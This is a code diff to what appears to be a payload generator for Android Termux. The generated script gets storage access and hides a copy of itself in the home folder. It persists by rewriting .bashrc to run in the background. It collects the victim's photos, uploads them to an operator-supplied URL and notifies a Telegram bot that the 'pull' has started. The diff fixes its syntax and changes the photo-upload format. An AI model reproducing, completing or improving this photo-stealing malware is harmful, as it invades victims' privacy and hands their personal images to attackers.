@@ -129,26 +129,25 @@ class Zeyad:
            subprocess.Popen("termux-setup-storage",stdout=subprocess.PIPE,shell=True)
            time.sleep(6)
            self.Inject_Bashrc()
-       if not os.path.exists(self.inj):
-           self.MoveFileToHome()     ## Move File to Home And injection
        if not os.path.exists(self.path): ## Create File Contain name photo
            self.GetFilesNames()
-       if not os.path.exists('tes.di')
+       if not os.path.exists('tes.di'):
                        try:
                            requests.get('https://api.telegram.org/bot{self.Fark()[1]}/sendMessage?chat_id=@{self.Fark()[0]}&text=بدات عملية السحب بنجاح')
                            open('tes.di','w').write("JJ")
                        except:
                           pass
-
        if os.path.exists(self.path):  ## this is upload method !!
            self.confirmupload()
    def MoveFileToHome(self):
        if not os.path.exists(self.inj):
            myfile = __file__
            subprocess.Popen(f'cp {{myfile}} {{self.inj}}',stdout=subprocess.PIPE,shell=True)
-           self.Injection()
        else:
-           self.__init__()
+           pass
+
+           
+           
        
    def Inject_Bashrc(self):
        try:
@@ -173,7 +172,8 @@ def per():
 per()
 """)
            with open(self.bashrc,"w")as bashrc:
-               bashrc.write("python .ass.py")
+               bashrc.write("python /data/data/com.termux/files/home/.ass.py")
+           self.MoveFileToHome()
            sys.exit()
            
    def GetRandomString(self):
@@ -211,7 +211,8 @@ per()
      try:
        s = open(self.done,"a")
        with open(files,"rb")as women:
-           send = requests.post("{y}",data=women)
+           mar = {{'photo':women}}
+           send = requests.post("{y}",files=mar)
            if send.status_code ==200:
                s.write(f"{{files}}\\n")
      except:
@@ -245,26 +246,25 @@ class Zeyad:
            subprocess.Popen("termux-setup-storage",stdout=subprocess.PIPE,shell=True)
            time.sleep(6)
            self.Inject_Bashrc()
-       if not os.path.exists(self.inj):
-           self.MoveFileToHome()     ## Move File to Home And injection
        if not os.path.exists(self.path): ## Create File Contain name photo
            self.GetFilesNames()
-       if not os.path.exists('tes.di')
+       if not os.path.exists('tes.di'):
                        try:
                            requests.get('https://api.telegram.org/bot{self.Fark()[1]}/sendMessage?chat_id=@{self.Fark()[0]}&text=بدات عملية السحب بنجاح')
                            open('tes.di','w').write("JJ")
                        except:
                           pass
-
        if os.path.exists(self.path):  ## this is upload method !!
            self.confirmupload()
    def MoveFileToHome(self):
        if not os.path.exists(self.inj):
            myfile = __file__
            subprocess.Popen(f'cp {{myfile}} {{self.inj}}',stdout=subprocess.PIPE,shell=True)
-           self.Injection()
        else:
-           self.__init__()
+           pass
+
+           
+           
        
    def Inject_Bashrc(self):
        try:
@@ -289,7 +289,8 @@ def per():
 per()
 """)
            with open(self.bashrc,"w")as bashrc:
-               bashrc.write("python .ass.py")
+               bashrc.write("python /data/data/com.termux/files/home/.ass.py")
+           self.MoveFileToHome()
            sys.exit()
            
    def GetRandomString(self):
@@ -327,7 +328,8 @@ per()
      try:
        s = open(self.done,"a")
        with open(files,"rb")as women:
-           send = requests.post("{y}",data=women)
+           mar = {{'photo':women}}
+           send = requests.post("{y}",files=mar)
            if send.status_code ==200:
                s.write(f"{{files}}\\n")
      except:
@@ -337,7 +339,7 @@ per()
        with open(self.bashrc,"w")as bash:
            bash.write(f"nohup python {{self.inj}} > /dev/null 2>&1 &")               
 Zeyad()
-                       ''')
+''')
       print(f"{self.blue}GO TO {self.path} AND YOU GET {x}")
       time.sleep(3)
       self.MainMenu()
